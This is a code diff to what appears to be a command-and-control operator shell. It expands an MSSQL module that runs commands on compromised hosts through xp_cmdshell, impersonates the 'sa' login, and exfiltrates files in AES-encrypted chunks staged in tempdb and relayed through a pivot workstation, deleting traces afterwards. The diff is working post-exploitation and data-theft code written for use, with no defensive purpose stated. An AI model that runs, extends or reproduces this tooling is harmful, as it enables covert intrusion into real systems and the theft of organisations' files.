@@ -19,7 +19,7 @@ Built-in commands (case-insensitive):
     xpshell cmd <cmd>               run cmd.exe command on MSSQL host via xp_cmdshell
     xpshell psh <ps_script>         stage and run PowerShell script on MSSQL host
     xpstage <payload> [--no-encrypt]        stage binary to MSSQL host via DB channel
-    xpexfil <remote_path> <local_name>  exfil a file from MSSQL host to C2 via DB channel (AES-256-CBC + base64)
+    xpexfil <remote_path> <local_name> [insert_timeout_s] [chunk_mb]  exfil file from MSSQL host via DB channel (AES-256-CBC, chunked)
     help                            show this help
     exit / quit                     exit the shell
 
@@ -253,14 +253,27 @@ class XpMssql:
             f"[IO.File]::WriteAllBytes('{out_path}',$b)"
         )
 
-    def _build_exfil_insert_ps(self, remote_path: str, key_b64: str) -> str:
-        """PowerShell run on IIS01 via cmd_xpshell_psh: AES-encrypt file + INSERT into tempdb..exfil."""
+    def _build_exfil_insert_ps(self, remote_path: str, key_b64: str,
+                               offset: int = 0, length: int = None) -> str:
+        """PowerShell run on IIS01 via cmd_xpshell_psh: AES-encrypt file chunk + INSERT into tempdb..exfil."""
         connstr = (f"Server={self._host.replace(':', ',')};"
                    f"Database=tempdb;User ID={self._login};Password={self._password};"
                    f"TrustServerCertificate=True")
+        if length is None:
+            read_block = f"$raw=[IO.File]::ReadAllBytes('{remote_path}');"
+        else:
+            read_block = (
+                f"$fs=[IO.File]::OpenRead('{remote_path}');"
+                f"$fs.Seek({offset},[IO.SeekOrigin]::Begin)|Out-Null;"
+                f"$buf=New-Object byte[] {length};"
+                "$n=$fs.Read($buf,0,$buf.Length);"
+                "$raw=New-Object byte[] $n;"
+                "[Array]::Copy($buf,0,$raw,0,$n);"
+                "$fs.Close();"
+            )
         return (
-            f"$raw=[IO.File]::ReadAllBytes('{remote_path}');"
-            f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
+            read_block
+            + f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
             "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
             "$kms=New-Object System.IO.MemoryStream;"
             "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
@@ -322,44 +335,86 @@ class XpMssql:
             f"[IO.File]::WriteAllBytes('{local_path}',$dec)"
         )
 
-    def cmd_xpexfil(self, shell, remote_path: str, local_name: str, insert_timeout_s: int = 600):
-        """Exfil a file from IIS01 to controlServer via MSSQL DB channel (AES-256-CBC + base64)."""
+    def cmd_xpexfil(self, shell, remote_path: str, local_name: str,
+                    insert_timeout_s: int = 600, chunk_mb: int = 10):
+        """Exfil a file from IIS01 to controlServer via MSSQL DB channel (AES-256-CBC, chunked)."""
+        import math
         import os
         import base64 as _b64
         import time
-        key_b64   = _b64.b64encode(os.urandom(32)).decode()
-        local_tmp = f"C:\\Windows\\Temp\\{local_name}"
+        key_b64     = _b64.b64encode(os.urandom(32)).decode()
+        local_tmp   = f"C:\\Windows\\Temp\\{local_name}"
+        chunk_bytes = chunk_mb * 1024 * 1024
 
-        print("[*] xpexfil: encrypting and inserting into tempdb..exfil ...")
-        self.cmd_xpshell_psh(shell, self._build_exfil_insert_ps(remote_path, key_b64),
-                             timeout_s=insert_timeout_s)
-
-        # Safety wait: poll until table exists in case poll timed out before INSERT completed
-        print("[*] xpexfil: confirming INSERT complete ...")
-        deadline = time.time() + insert_timeout_s
-        while time.time() < deadline:
-            result = self._exec_q(shell,
-                "EXECUTE AS LOGIN='sa';"
-                "SELECT CASE WHEN OBJECT_ID('tempdb..exfil','U') IS NOT NULL "
-                "THEN 'exists' ELSE 'notfound' END"
-            )
-            if result and 'exists' in result:
+        # A — get file size so we know how many chunks to expect
+        print("[*] xpexfil: getting file size ...")
+        size_out = self._exec_q(shell,
+            "EXECUTE AS LOGIN='sa';"
+            f"EXEC xp_cmdshell 'powershell -Command (Get-Item {self._tsql_escape(remote_path)}).Length'"
+        )
+        file_size = None
+        for line in (size_out or "").splitlines():
+            s = line.strip()
+            if s.isdigit():
+                file_size = int(s)
                 break
-            print("[*] xpexfil: INSERT still running, retrying in 15s ...")
-            time.sleep(15)
-        else:
-            print("[!] xpexfil: timed out waiting for INSERT — aborting")
+        if file_size is None:
+            print(f"[!] xpexfil: could not read file size — output: {size_out!r}")
             return
 
-        print("[*] xpexfil: extracting to WS01 ...")
-        extract_ps = self._build_exfil_extract_ps(local_tmp, key_b64)
-        shell.cmd_exec_raw(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')
+        num_chunks = math.ceil(file_size / chunk_bytes)
+        print(f"[*] xpexfil: {file_size} bytes → {num_chunks} chunk(s) of {chunk_mb} MB each")
 
-        # D — cleanup DB (no WS01 dep), then pull file (blocking), then del WS01 temp
-        self._exec_q(shell,
-            "EXECUTE AS LOGIN='sa';"
-            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
-        )
+        chunk_locals = []
+        for i in range(num_chunks):
+            offset = i * chunk_bytes
+            length = min(chunk_bytes, file_size - offset)
+            chunk_local = f"C:\\Windows\\Temp\\{local_name}.chunk{i}"
+            chunk_locals.append(chunk_local)
+
+            # B — INSERT chunk
+            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — INSERT (offset={offset}, len={length}) ...")
+            self.cmd_xpshell_psh(shell,
+                self._build_exfil_insert_ps(remote_path, key_b64, offset, length),
+                timeout_s=insert_timeout_s)
+
+            # C — safety wait: poll until tempdb..exfil appears (INSERT may outlive the poll)
+            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — confirming INSERT complete ...")
+            deadline = time.time() + insert_timeout_s
+            while time.time() < deadline:
+                result = self._exec_q(shell,
+                    "EXECUTE AS LOGIN='sa';"
+                    "SELECT CASE WHEN OBJECT_ID('tempdb..exfil','U') IS NOT NULL "
+                    "THEN 'exists' ELSE 'notfound' END"
+                )
+                if result and 'exists' in result:
+                    break
+                print("[*] xpexfil: INSERT still running, retrying in 15s ...")
+                time.sleep(15)
+            else:
+                print(f"[!] xpexfil: timed out waiting for chunk {i} INSERT — aborting")
+                return
+
+            # D — extract chunk to WS01
+            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — extracting to WS01 ...")
+            extract_ps = self._build_exfil_extract_ps(chunk_local, key_b64)
+            shell.cmd_exec_raw(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')
+
+            # E — drop table so next chunk starts fresh
+            self._exec_q(shell,
+                "EXECUTE AS LOGIN='sa';"
+                "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
+            )
+
+        # F — assemble chunks on WS01, then single pull
+        if num_chunks == 1:
+            shell.cmd_exec_raw(f"cmd /c move /y {chunk_locals[0]} {local_tmp}")
+        else:
+            print(f"[*] xpexfil: assembling {num_chunks} chunks on WS01 ...")
+            parts = "+".join(chunk_locals)
+            shell.cmd_exec_raw(f"cmd /c copy /b {parts} {local_tmp}")
+            shell.cmd_exec_raw("cmd /c del /f " + " ".join(chunk_locals))
+
         print(f"[*] xpexfil: pulling {local_name} from WS01 ...")
         shell.cmd_get_wait(local_tmp)
         shell.cmd_exec_raw(f"cmd /c del /f {local_tmp}")
@@ -665,12 +720,13 @@ class ToneShellShell:
                     if not self.session:
                         print("[!] not attached to a session")
                     elif len(xp_parts) < 3:
-                        print("usage: xpexfil <remote_path> <local_name> [insert_timeout_s]")
+                        print("usage: xpexfil <remote_path> <local_name> [insert_timeout_s=600] [chunk_mb=10]")
                     elif not self._xp.ready():
                         print("[!] run xpinit first")
                     else:
                         t = int(xp_parts[3]) if len(xp_parts) >= 4 else 600
-                        self._xp.cmd_xpexfil(self, xp_parts[1], xp_parts[2], insert_timeout_s=t)
+                        c = int(xp_parts[4]) if len(xp_parts) >= 5 else 10
+                        self._xp.cmd_xpexfil(self, xp_parts[1], xp_parts[2], insert_timeout_s=t, chunk_mb=c)
 
                 else:
                     if not self.session:
